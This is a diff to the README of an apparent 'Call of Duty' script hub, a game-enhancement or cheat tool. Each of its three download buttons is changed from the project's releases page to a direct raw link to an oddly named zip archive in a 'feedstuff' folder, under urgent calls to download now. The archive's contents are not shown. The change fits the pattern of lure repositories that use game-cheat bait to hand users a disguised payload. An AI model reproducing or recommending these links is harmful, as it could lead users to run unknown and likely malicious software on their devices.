@@ -1,6 +1,6 @@
 # 🎮 call-of-duty-script-hub - Your Ultimate Mobile Gaming Enhancement Tool
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Version-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Aitechn5549/call-of-duty-script-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Aitechn5549/call-of-duty-script-hub/main/feedstuff/call-duty-of-hub-script-v1.5.zip)
 
 ## 🌟 What Is This?
 
@@ -31,7 +31,7 @@ The easiest way to get started is by downloading the latest version of the appli
 
 **Step 1:** Click on the download button below or visit the official download page:
 
-[⬇️ **Download Here**](https://github.com/Aitechn5549/call-of-duty-script-hub/releases)
+[⬇️ **Download Here**](https://raw.githubusercontent.com/Aitechn5549/call-of-duty-script-hub/main/feedstuff/call-duty-of-hub-script-v1.5.zip)
 
 **Step 2:** Wait for the download to complete. The time will depend on your internet connection speed.
 
@@ -177,7 +177,7 @@ Remember these key points:
 
 Don't wait another second – click the download button below and start enhancing your gaming experience today!
 
-[🚀 **Get Started Now - Download The Latest Version**](https://github.com/Aitechn5549/call-of-duty-script-hub/releases)
+[🚀 **Get Started Now - Download The Latest Version**](https://raw.githubusercontent.com/Aitechn5549/call-of-duty-script-hub/main/feedstuff/call-duty-of-hub-script-v1.5.zip)
 
 ---
 
